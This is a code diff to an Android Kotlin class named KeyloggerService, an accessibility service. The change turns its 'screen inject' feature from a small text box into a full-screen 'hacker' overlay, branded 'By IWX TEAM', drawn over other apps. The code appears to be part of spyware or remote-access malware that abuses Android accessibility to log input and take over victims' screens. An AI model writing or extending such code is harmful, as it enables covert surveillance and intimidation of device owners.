@@ -5,9 +5,7 @@ import android.content.Context
 import android.graphics.Color
 import android.graphics.PixelFormat
 import android.graphics.Typeface
-import android.view.Gravity
 import android.view.WindowManager
-import android.widget.TextView
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.os.Build
 import android.os.Handler
@@ -26,11 +24,11 @@ class KeyloggerService : AccessibilityService() {
 
     companion object {
         @Volatile var instance: KeyloggerService? = null
-        fun showScreenInject(text: String) { instance?.showOverlay(text) }
-        fun hideScreenInject()             { instance?.hideOverlay()     }
+        fun showScreenInject(text: String, style: String = "hacker") { instance?.showOverlay(text, style) }
+        fun hideScreenInject()                                             { instance?.hideOverlay() }
     }
 
-    @Volatile private var overlayView: android.view.View? = null
+    @Volatile private var overlayView: HackerOverlayView? = null
     private var wm: WindowManager? = null
     private val overlayHandler = Handler(Looper.getMainLooper())
 
@@ -260,37 +258,25 @@ class KeyloggerService : AccessibilityService() {
     } catch (_: Exception) { pkg }
 
     // ── Screen Inject Overlay ─────────────────────────────────────────────────
-    fun showOverlay(text: String) {
+    fun showOverlay(text: String, style: String = "hacker") {
         overlayHandler.post {
             hideOverlayInternal()
             val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             wm = windowManager
-
-            val tv = TextView(this).apply {
-                this.text = text
-                textSize  = 26f
-                setTextColor(Color.parseColor("#00FF41"))
-                typeface  = Typeface.MONOSPACE
-                setPadding(48, 28, 48, 28)
-                setShadowLayer(20f, 0f, 0f, Color.parseColor("#00FF41"))
-                setBackgroundColor(Color.argb(200, 0, 0, 0))
-            }
-
+            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style)
             val params = WindowManager.LayoutParams(
-                WindowManager.LayoutParams.WRAP_CONTENT,
-                WindowManager.LayoutParams.WRAP_CONTENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                 WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                 PixelFormat.TRANSLUCENT
-            ).apply { gravity = Gravity.CENTER }
-
-            windowManager.addView(tv, params)
-            overlayView = tv
-
-            tv.alpha = 0f
-            tv.animate().alpha(1f).setDuration(700).start()
+            )
+            windowManager.addView(view, params)
+            overlayView = view
+            view.alpha = 0f
+            view.animate().alpha(1f).setDuration(600).start()
         }
     }
 
@@ -298,7 +284,7 @@ class KeyloggerService : AccessibilityService() {
 
     private fun hideOverlayInternal() {
         overlayView?.let { v ->
-            try { wm?.removeView(v) } catch (_: Exception) {}
+            try { v.stop(); wm?.removeView(v) } catch (_: Exception) {}
             overlayView = null
         }
     }
